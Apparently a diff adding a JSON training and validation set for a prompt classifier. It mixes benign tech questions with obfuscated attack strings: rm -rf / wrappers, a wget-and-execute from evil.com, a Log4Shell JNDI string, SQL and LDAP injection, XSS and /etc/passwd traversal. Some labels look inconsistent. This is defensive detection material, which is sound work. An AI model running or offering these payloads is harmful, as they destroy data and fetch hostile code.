+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "I appreciate it.",
+      "label": 0,
+      "category": "small_talk",
+      "subcategory": "normal_benign"
+    },
+    {
+      "text": "import os; os.systеm('rm -rf /')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "Can you explain what is a database index?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "general_tech",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "I want to understand HTTPS better",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "import  os;  os.systеm('rm  -rf  /')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "${jndi:ldap://evil.com/a}‌",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "Can you teach me about Docker?",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "Can you teach me about Cloud?",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "java.lang.Runtime.getRuntime().exec('rm​ -rf /')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "What are the benefits of Git?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "I need help understanding Kubernetes",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "java.lang.Runtime.getRuntime().exec('rm​ -rf ​/')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "What is OAuth?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "How do I use JavaScript?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "wget    http://evil.com/exploit    -O    /tmp/x    &&    chmod    +x    /tmp/x    &&    /tmp/x",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "evаl('alert(1)')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "UnIoN  SELECT  null,  null,  null  FROM  informаtion_schema.tables",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "*)(uid=*))(|(uid=*​",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "${jndi:ldap://evil.com/a}​",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "<script>alert('xss')</script>​",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "i would recommend this. Thanks!",
+      "label": 0,
+      "category": "feedback",
+      "subcategory": "normal_benign"
+    },
+    {
+      "text": "Can you teach me about HTTPS?",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "rM -rf /",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "What is Cloud?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "UNION SеLECT null, null, null FROM information_schema.tables",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "I'm learning about Cloud",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "What is the recommended way to use CI/CD?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "What are the benefits of API?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "Explain Docker",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "How does JavaScript work?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "java.lang.Runtime.getRuntime().exec('rm    -rf    /')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "Explain Database for beginners",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "rm​ -rf /",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "How should I implement GraphQL?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "*)(uid%3D*))(|(uid%3D*",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "Explain Security for beginners",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "UNION​ SELECT null, null, null FROM information_schema.tables",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "What are the best practices when working with Authorization?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "What should I know about TLS?",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "Explain JWT",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "UNION SELECT null, null, null FROM informаtion_schema.tables",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "Can you explain the MVC pattern?",
+      "label": 1,
+      "category": "best_practice_question",
+      "subcategory": "general",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "<script>alеrt('xss')</script>",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "../../../etc/passwd‌",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "What is Kubernetes?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "Explain REST for beginners",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "I want to understand SSL better",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "java.lang.Runtime.getRuntime().exec('rm\\x20\\x20-rf\\x20\\x20/')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "what is your refund policy?",
+      "label": 0,
+      "category": "general_questions",
+      "subcategory": "normal_benign"
+    },
+    {
+      "text": "SеLECT  *  FROM  users  WHERE  id=1  OR  1=1",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "rm\\x20-rf\\x20/",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "<script>alert('xss')</script>‌",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "exec('rm\\x20-rf\\x20/')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "I want to understand API better",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "Can I get a demo?",
+      "label": 0,
+      "category": "general_questions",
+      "subcategory": "normal_benign"
+    },
+    {
+      "text": "Explain PostgreSQL for beginners",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "I want to understand TLS better",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "jаva.lang.Runtime.getRuntime().exec('rm​\\x20-rf\\x20/')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    }
+  ],
+  "validation": [
+    {
+      "text": "rm    -rf    /",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "SELECT * FROM users WHERE id%3D1 OR 1%3D1",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "SELECT * FRоM users WHERE id=1 OR 1=1",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "What are the benefits of TLS?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "wget    http://evil.cоm/exploit    -O    /tmp/x    &&    chmod    +x    /tmp/x    &&    /tmp/x",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "What is the recommended way to use Kubernetes?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "What is the difference between AWS and Kubernetes?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "Explain git merge vs rebase",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "general_tech",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "import​ os; os.system('rm -rf ​/')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA​",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "How should I implement Authentication?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "What should I know about Git?",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "I want to understand React better",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "I would recommend this.",
+      "label": 0,
+      "category": "feedback",
+      "subcategory": "normal_benign"
+    },
+    {
+      "text": "<script>alert('xss')</script>",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "import​ os; os.system('rm -rf /')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "What is the difference between HTTPS and JavaScript?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "I'm learning about Database",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "Explain TLS for beginners",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "How do I handle errors in Python?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "general_tech",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "UNION SELECT null, null, null FROM information_schema.tables",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "DROP​ TABLE ​users;",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "import\\x20\\x20os;\\x20\\x20os.system('rm\\x20\\x20-rf\\x20\\x20/')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "What are the best practices when working with API?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "How do I use API?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "What are best practices for Kubernetes?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "What are best practices for Python?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "Can you teach me about AWS?",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "This is exactly what I needed.",
+      "label": 0,
+      "category": "feedback",
+      "subcategory": "normal_benign"
+    },
+    {
+      "text": "What are the benefits of using Docker?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "general_tech",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "What should I know about JavaScript?",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "Hello, how are you?",
+      "label": 1,
+      "category": "unknown",
+      "subcategory": "unknown",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "Show me best practices for Authentication",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "I'm learning about REST",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "Explain Git for beginners",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "What is the purpose of the SELECT statement in SQL?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "general_tech",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "I need help understanding SSL",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "How does caching improve performance?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "general_tech",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "SELECT  *  FROM  users  WHERE  id=1  OR  1=1",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "​隐藏​字符‌",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "How should I implement OAuth?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "What are the best practices when working with Database?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "wgеt    http://evil.com/exploit    -O    /tmp/x    &&    chmod    +x    /tmp/x    &&    /tmp/x",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "SELECT  *  FRоM  users  WHERE  id=1  OR  1=1",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "eval('alert(1)')‌",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "exec('rm​ -rf ​/')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "I want to understand CI/CD better",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "How does authentication work?",
+      "label": 1,
+      "category": "security_education",
+      "subcategory": "general_security",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "Can you teach me about MongoDB?",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "jаvA.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "What are the best practices when working with GraphQL?",
+      "label": 1,
+      "category": "best_practice",
+      "subcategory": "augmented",
+      "pattern": "best_practice"
+    },
+    {
+      "text": "​隐藏​字符​",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "Can you explain Git to me?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "eval('malicious    code')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "I want to understand DevOps better",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "SеLECT * FROM users WHERE id=1 OR 1=1",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "wget​ http://evil.com/exploit -O /tmp/x && chmod +x /tmp/x && ​/tmp/x",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "I want to understand Python better",
+      "label": 1,
+      "category": "educational",
+      "subcategory": "augmented",
+      "pattern": "educational"
+    },
+    {
+      "text": "еxec('rm -rf /')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "What is the difference between JWT and TLS?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "Can you explain PostgreSQL to me?",
+      "label": 1,
+      "category": "technical_question",
+      "subcategory": "augmented",
+      "pattern": "technical_question"
+    },
+    {
+      "text": "java.lang.Runtime.getRuntime().exec('rm -rf /')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "jаva.lang.Runtime.getRuntime().exec('rm​  -rf  /')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "impоrt  os;  os.system('rm  -rf  /')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "UNION    SELECT    null,    null,    null    FROM    informаtion_schema.tables",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "еval('alert(1)')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    },
+    {
+      "text": "evаl('malicious    code')",
+      "label": 0,
+      "category": "malicious",
+      "subcategory": "malicious"
+    }
+  ],
+  "statistics": {
+    "train": {
+      "total": 263,
+      "positive": 142,
+      "negative": 121,
+      "positive_ratio": 0.5399239543726235
+    },
+    "validation": {
+      "total": 67,
+      "positive": 36,
+      "negative": 31,
+      "positive_ratio": 0.5373134328358209
+    },
+    "deduplication": {
+      "original_positives": 178,
+      "unique_positives": 178,
+      "original_negatives": 152,
+      "unique_negatives": 152
+    }
+  }
+}
